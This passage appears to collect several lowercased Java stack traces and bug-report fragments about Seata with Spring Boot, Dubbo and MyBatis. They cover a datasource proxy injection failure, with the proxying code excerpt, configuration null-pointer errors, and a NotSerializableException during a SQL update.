~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:306) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:302) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1138) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1066) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.autowirebytype(abstractautowirecapablebeanfactory.java:1342) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.populatebean(abstractautowirecapablebeanfactory.java:1249) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:553) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:483) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:306) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:302) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1138) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1066) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor$autowiredfieldelement.inject(autowiredannotationbeanpostprocessor.java:585) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.annotation.injectionmetadata.inject(injectionmetadata.java:88) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor.postprocesspropertyvalues(autowiredannotationbeanpostprocessor.java:366) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.populatebean(abstractautowirecapablebeanfactory.java:1264) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:553) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:483) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:306) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:302) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1138) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1066) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor$autowiredfieldelement.inject(autowiredannotationbeanpostprocessor.java:585) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.annotation.injectionmetadata.inject(injectionmetadata.java:88) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor.postprocesspropertyvalues(autowiredannotationbeanpostprocessor.java:366) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.populatebean(abstractautowirecapablebeanfactory.java:1264) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:553) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:483) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:306) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:302) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:197) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.preinstantiatesingletons(defaultlistablebeanfactory.java:761) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.context.support.abstractapplicationcontext.finishbeanfactoryinitialization(abstractapplicationcontext.java:867) ~[spring-context-4.3.13.release.jar:4.3.13.release] at org.springframework.context.support.abstractapplicationcontext.refresh(abstractapplicationcontext.java:543) ~[spring-context-4.3.13.release.jar:4.3.13.release] at org.springframework.boot.context.embedded.embeddedwebapplicationcontext.refresh(embeddedwebapplicationcontext.java:122) ~[spring-boot-1.5.9.release.jar:1.5.9.release] at org.springframework.boot.springapplication.refresh(springapplication.java:693) [spring-boot-1.5.9.release.jar:1.5.9.release] at org.springframework.boot.springapplication.refreshcontext(springapplication.java:360) [spring-boot-1.5.9.release.jar:1.5.9.release] at org.springframework.boot.springapplication.run(springapplication.java:303) [spring-boot-1.5.9.release.jar:1.5.9.release] at org.springframework.boot.springapplication.run(springapplication.java:1118) [spring-boot-1.5.9.release.jar:1.5.9.release] at org.springframework.boot.springapplication.run(springapplication.java:1107) [spring-boot-1.5.9.release.jar:1.5.9.release] at io.seata.samples.integration.order.orderexampleapplication.main(orderexampleapplication.java:17) [classes/:na] 2019-12-17 09:04:11.446 error 1161 --- [ main] o.s.b.d.loggingfailureanalysisreporter : ***************************
application failed to start
*************************** description: the bean 'datasource' could not be injected as a 'javax.sql.datasource' because it is a jdk dynamic proxy that implements: javax.sql.commondatasource java.sql.wrapper
describe the reason why happened get target bean's interface is not all its interfaces when creating jdk proxy of target bean.
``` public object postprocessafterinitialization(object bean, string beanname) throws beansexception { if (bean instanceof datasource && !(bean instanceof datasourceproxy) && configurationfactory.getinstance().getboolean(datasource_autoproxy, false)) { if (logger.isinfoenabled()) { logger.info("auto proxy of [{}]", beanname); } datasourceproxy datasourceproxy = datasourceproxyholder.get().putdatasource((datasource) bean); // the interfaces just contains only org.springframework.beans.factory.initializingbean of druiddatasourcewrapper when using druid-spring-boot-starter, not all interfaces of druiddatasourcewrapper // all the interfaces of druiddatasourcewrapper are needed here, especially the interfaces related to javax.sql.datasource class<?>[] interfaces = bean.getclass().getinterfaces(); return proxy.newproxyinstance(thread.currentthread().getcontextclassloader(), interfaces, new invocationhandler() { @override public object invoke(object proxy, method method, object[] args) throws throwable { method m = beanutils.finddeclaredmethod(datasourceproxy.class, method.getname(), method.getparametertypes()); if (null != m) { return m.invoke(datasourceproxy, args); } else { boolean oldaccessible = method.isaccessible(); try { method.setaccessible(true); return method.invoke(bean, args); } finally { //recover the original accessible for security reason method.setaccessible(oldaccessible); } } } }); } return bean;
org.springframework.beans.factory.beancreationexception: error creating bean with name 'globaltransactionscanner' defined in class path resource [io/seata/spring/boot/autoconfigure/seataautoconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [io.seata.spring.annotation.globaltransactionscanner]: factory method 'globaltransactionscanner' threw exception; nested exception is java.lang.exceptionininitializererror at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:627) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:456) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1321) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1160) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:555) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:515) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.abstractbeanfactory.lambda$dogetbean$0(abstractbeanfactory.java:320) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:222) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:318) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:204) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.context.support.postprocessorregistrationdelegate.registerbeanpostprocessors(postprocessorregistrationdelegate.java:228) ~[spring-context-5.1.9.release.jar:5.1.9.release] at org.springframework.context.support.abstractapplicationcontext.registerbeanpostprocessors(abstractapplicationcontext.java:721) ~[spring-context-5.1.9.release.jar:5.1.9.release] at org.springframework.context.support.abstractapplicationcontext.refresh(abstractapplicationcontext.java:534) ~[spring-context-5.1.9.release.jar:5.1.9.release] at org.springframework.boot.web.servlet.context.servletwebserverapplicationcontext.refresh(servletwebserverapplicationcontext.java:141) ~[spring-boot-2.1.8.release.jar:2.1.8.release] at org.springframework.boot.springapplication.refresh(springapplication.java:744) [spring-boot-2.1.8.release.jar:2.1.8.release] at org.springframework.boot.springapplication.refreshcontext(springapplication.java:391) [spring-boot-2.1.8.release.jar:2.1.8.release] at org.springframework.boot.springapplication.run(springapplication.java:312) [spring-boot-2.1.8.release.jar:2.1.8.release] at org.test.providerapplication.main(providerapplication.java:22) [classes/:?]
caused by: org.springframework.beans.beaninstantiationexception: failed to instantiate [io.seata.spring.annotation.globaltransactionscanner]: factory method 'globaltransactionscanner' threw exception; nested exception is java.lang.exceptionininitializererror at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:185) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:622) ~[spring-beans-5.1.9.release.jar:5.1.9.release] ..
caused by: java.lang.exceptionininitializererror at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:90) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:133) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:122) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.spring.boot.autoconfigure.seataautoconfiguration.globaltransactionscanner(seataautoconfiguration.java:57) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at io.seata.spring.boot.autoconfigure.seataautoconfiguration$$enhancerbyspringcglib$$6d0d178a.cglib$globaltransactionscanner$1(<generated>) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at io.seata.spring.boot.autoconfigure.seataautoconfiguration$$enhancerbyspringcglib$$6d0d178a$$fastclassbyspringcglib$$d8c42c73.invoke(<generated>) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at org.springframework.cglib.proxy.methodproxy.invokesuper(methodproxy.java:244) ~[spring-core-5.1.9.release.jar:5.1.9.release] at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:363) ~[spring-context-5.1.9.release.jar:5.1.9.release] at io.seata.spring.boot.autoconfigure.seataautoconfiguration$$enhancerbyspringcglib$$6d0d178a.globaltransactionscanner(<generated>) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[?:1.8.0_201] at sun.reflect.nativemethodaccessorimpl.invoke(unknown source) ~[?:1.8.0_201] at sun.reflect.delegatingmethodaccessorimpl.invoke(unknown source) ~[?:1.8.0_201] at java.lang.reflect.method.invoke(unknown source) ~[?:1.8.0_201] at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:154) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:622) ~[spring-beans-5.1.9.release.jar:5.1.9.release] ..
caused by: java.lang.nullpointerexception at io.seata.config.fileconfiguration.<init>(fileconfiguration.java:96) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.config.configurationfactory.<clinit>(configurationfactory.java:58) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:90) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:133) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.spring.annotation.globaltransactionscanner.<init>(globaltransactionscanner.java:122) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.spring.boot.autoconfigure.seataautoconfiguration.globaltransactionscanner(seataautoconfiguration.java:57) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at io.seata.spring.boot.autoconfigure.seataautoconfiguration$$enhancerbyspringcglib$$6d0d178a.cglib$globaltransactionscanner$1(<generated>) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at io.seata.spring.boot.autoconfigure.seataautoconfiguration$$enhancerbyspringcglib$$6d0d178a$$fastclassbyspringcglib$$d8c42c73.invoke(<generated>) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at org.springframework.cglib.proxy.methodproxy.invokesuper(methodproxy.java:244) ~[spring-core-5.1.9.release.jar:5.1.9.release] at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:363) ~[spring-context-5.1.9.release.jar:5.1.9.release] at io.seata.spring.boot.autoconfigure.seataautoconfiguration$$enhancerbyspringcglib$$6d0d178a.globaltransactionscanner(<generated>) ~[seata-spring-boot-starter-1.0.0-snapshot.jar:?] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[?:1.8.0_201] at sun.reflect.nativemethodaccessorimpl.invoke(unknown source) ~[?:1.8.0_201] at sun.reflect.delegatingmethodaccessorimpl.invoke(unknown source) ~[?:1.8.0_201] at java.lang.reflect.method.invoke(unknown source) ~[?:1.8.0_201] at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:154) ~[spring-beans-5.1.9.release.jar:5.1.9.release] at org.springframework.beans.factory.support.constructorresolver.instantiate(constructorresolver.java:622) ~[spring-beans-5.1.9.release.jar:5.1.9.release] ..
17 more ```
![image](
java.lang.nullpointerexception: null at io.seata.core.context.rootcontext.bindinterceptortype(rootcontext.java:92) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at io.seata.integration.dubbo.transactionpropagationfilter.invoke(transactionpropagationfilter.java:57) ~[seata-all-1.0.0-snapshot.jar:1.0.0-snapshot] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.filter.exceptionfilter.invoke(exceptionfilter.java:55) ~[dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.monitor.support.monitorfilter.invoke(monitorfilter.java:92) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.filter.timeoutfilter.invoke(timeoutfilter.java:48) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.dubbo.filter.tracefilter.invoke(tracefilter.java:81) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.filter.contextfilter.invoke(contextfilter.java:105) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.filter.genericfilter.invoke(genericfilter.java:149) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.filter.classloaderfilter.invoke(classloaderfilter.java:38) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.filter.echofilter.invoke(echofilter.java:41) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:82) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$callbackregistrationinvoker.invoke(protocolfilterwrapper.java:157) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.rpc.protocol.dubbo.dubboprotocol$1.reply(dubboprotocol.java:152) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.handlerequest(headerexchangehandler.java:102) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.received(headerexchangehandler.java:193) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.remoting.transport.decodehandler.received(decodehandler.java:51) [dubbo-2.7.4.1.jar:2.7.4.1] at org.apache.dubbo.remoting.transport.dispatcher.channeleventrunnable.run(channeleventrunnable.java:57) [dubbo-2.7.4.1.jar:2.7.4.1] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_161] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_161] at java.lang.thread.run(thread.java:748) [na:1.8.0_161]
org.springframework.dao.transientdataaccessresourceexception: ### error updating database
cause: java.sql.sqlexception: invalid argument value: java.io.notserializableexception
### the error may exist in url [jar:file:/usr/local/hy_srm/business/business-1.0.0.jar!/boot-inf/classes!/mapper/projectinfomapper.xml]
### the error may involve defaultparametermap
### the error occurred while setting parameters
### sql: update t_project_info set cost=?, update_user=? where id = ? and available = 1
### cause: java.sql.sqlexception: invalid argument value: java.io.notserializableexception
; invalid argument value: java.io.notserializableexception; nested exception is java.sql.sqlexception: invalid argument value: java.io.notserializableexception at org.springframework.jdbc.support.sqlstatesqlexceptiontranslator.dotranslate(sqlstatesqlexceptiontranslator.java:110) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:72) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.mybatis.spring.mybatisexceptiontranslator.translateexceptionifpossible(mybatisexceptiontranslator.java:74) at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:440) at com.sun.proxy.$proxy83.update(unknown source) at org.mybatis.spring.sqlsessiontemplate.update(sqlsessiontemplate.java:287) at org.apache.ibatis.binding.mappermethod.execute(mappermethod.java:67) at org.apache.ibatis.binding.mapperproxy.invoke(mapperproxy.java:57) at com.sun.proxy.$proxy95.updateoutputbycondition(unknown source) at com.base.business.approval.service.projecbatchapprovalservice.approval(projecbatchapprovalservice.java:97) at com.base.business.approval.service.projecbatchapprovalservice$$fastclassbyspringcglib$$b71213d9.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:749) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:295) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:98) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:104) at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:64) at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:101) at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:76) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) at com.base.business.approval.service.projecbatchapprovalservice$$enhancerbyspringcglib$$1ed5b9ff.approval(<generated>) at com.base.business.approval.service.projecapprovalservice.batchapproval(projecapprovalservice.java:460) at com.base.business.approval.service.projecapprovalservice$$fastclassbyspringcglib$$2904b2d1.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:749) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:295) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:98) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:104) at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:64) at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:101) at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:76) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) at com.base.business.approval.service.projecapprovalservice$$enhancerbyspringcglib$$38ecb1e7.batchapproval(<generated>) at com.base.business.approval.controller.projectapprovalcontroller.batchapproval(projectapprovalcontroller.java:125) at com.base.business.approval.controller.projectapprovalcontroller$$fastclassbyspringcglib$$cd108533.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:749) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) at org.apache.shiro.spring.security.interceptor.aopallianceannotationsauthorizingmethodinterceptor$1.proceed(aopallianceannotationsauthorizingmethodinterceptor.java:82) at org.apache.shiro.authz.aop.authorizingmethodinterceptor.invoke(authorizingmethodinterceptor.java:39) at org.apache.shiro.spring.security.interceptor.aopallianceannotationsauthorizingmethodinterceptor.invoke(aopallianceannotationsauthorizingmethodinterceptor.java:115) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) at org.springframework.aop.aspectj.methodinvocationproceedingjoinpoint.proceed(methodinvocationproceedingjoinpoint.java:88) at com.base.core.aop.aspect.operatelogaspect.around(operatelogaspect.java:58) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.aop.aspectj.abstractaspectjadvice.invokeadvicemethodwithgivenargs(abstractaspectjadvice.java:644) at org.springframework.aop.aspectj.abstractaspectjadvice.invokeadvicemethod(abstractaspectjadvice.java:633) at org.springframework.aop.aspectj.aspectjaroundadvice.invoke(aspectjaroundadvice.java:70) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:175) at org.springframework.aop.aspectj.methodinvocationproceedingjoinpoint.proceed(methodinvocationproceedingjoinpoint.java:88) at com.base.core.aop.aspect.controllerlogaspect.around(controllerlogaspect.java:64) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.aop.aspectj.abstractaspectjadvice.invokeadvicemethodwithgivenargs(abstractaspectjadvice.java:644) at org.springframework.aop.aspectj.abstractaspectjadvice.invokeadvicemethod(abstractaspectjadvice.java:633) at org.springframework.aop.aspectj.aspectjaroundadvice.invoke(aspectjaroundadvice.java:70) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:175) at org.springframework.aop.interceptor.exposeinvocationinterceptor.invoke(exposeinvocationinterceptor.java:93) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) at com.base.business.approval.controller.projectapprovalcontroller$$enhancerbyspringcglib$$c64b8d0d.batchapproval(<generated>) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:190) at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:104) at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:892) at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:797) at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1039) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:942) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1005) at org.springframework.web.servlet.frameworkservlet.doput(frameworkservlet.java:919) at javax.servlet.http.httpservlet.service(httpservlet.java:663) at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:882) at 